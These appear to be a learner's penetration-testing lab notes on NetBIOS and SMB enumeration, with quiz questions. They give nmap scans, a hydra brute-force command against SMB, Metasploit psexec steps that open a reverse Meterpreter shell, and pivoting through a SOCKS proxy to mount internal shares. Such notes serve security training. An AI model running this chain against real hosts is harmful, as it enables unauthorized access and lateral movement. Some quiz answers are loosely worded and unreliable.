# NetBIOS & SMB Enumberation

## NetBIOS (Network Basic Input/Output System)

NetBIOS is an API and a set of network protocols for providing communicaation services over a local network. It's used primarily to allow applications on different computers to find and interact with each other on a network

Ports:
137 ---> Name Service
138 ---> Datagram Service
139 ---> Session Service over UDP and TCP

- __1.`nmblookup <ip>`__
- __2.`nbtscan <ip>`__

> Note: Sometimes NetBIOS service runs on UDP so go for -sU in Nmap
  - `nmap -sU -p 137 <ip>`
  - `nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n <ip>` 
# Q&A
- __1.Which tool is commonly used to perform basic NetBIOS enumeration?__
  - __Ans. `nbstat`__

## SMB (Server Message Block)

SMB is a network file sharing protocol that allows computers on a network to share files,printers, and other resources. It is the primary protocol used in Windows networks for these purposes.

Ports:
445 ---> is the direct SMB port.
139 ---> is used for SMB when it's utilizing NetBIOS over TCP/IP.

  - `nmap -sV -p 139,445 demo.ine.local`
  - `nmap -p 445 --script smb-protocols`

- __nmap__
  - __`nmap -p 445 --script smb-enum-users <ip>`__
  - __Save the users in the user.txt for brute force attack__
- __hydra__
  - __`hydra -L user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip> smb`__
  - __You can use psexec module in metasploit__
- __msfconsole__
  - __`service postgresql start & msfconsole`__
  - __`search psexec`__
  - __`set RHOSTS <target ip>`__
  - __`set SMBUser <username>`__
  - __`set SMBPass <password>`__
  - __`exploit`__
  - > __If you are not getting then switch to x64 bit meterpreter session__
    - __`set payload windows/x64/meterpreter/reverse_tcp
    - __`exploit`__
  - __`sysinfo`__
  - __`shell`__
  - > __make this session in the background__

- __pivoting__
  - __set the autoroute for the target in metasploit__
    - __`run autoroute -s 10.0.1.0/20`__
  - __check the porxchain in the kali__
    - __`cat /etc/proxychains.conf` or `cat /etc/proxychains4a.conf`__
  - __search in msfconsole__
    - __`search socks4`__
    - __`use auxiliary/server/socks_proxy`__
      - __`set VERSION 4a`__
      - __`set SRVPORT 9050`__
      - __`exploit`__
  - __now open kali you can do the nmap__
    - __`proxychains nmap -sV -T4 -O -Pn -p 445 <ip>`__
  - __use the net view in the the reverse shell__
    - __`migrate -N explorer.exe`__
    - __`shell`__
     - __`net view <ip_of_the_subnet>`__
     - __`net use D: \\<subip>\Documents`__






 
# Q&A
- __1.What is the primary purpose of SMB in Windows networks?__
  - __Ans. `To facilitate network file sharing and resource access`__

- __2.Why do modern Windows networks primarily use SMB instead of NetBIOS?__
  - __Ans.`SMB offers better performance and security`__

- __3.Why is SMBv1 considered insecure?__
  - __Ans. `It allows anonymous logons and has several security vulnerabilities`__








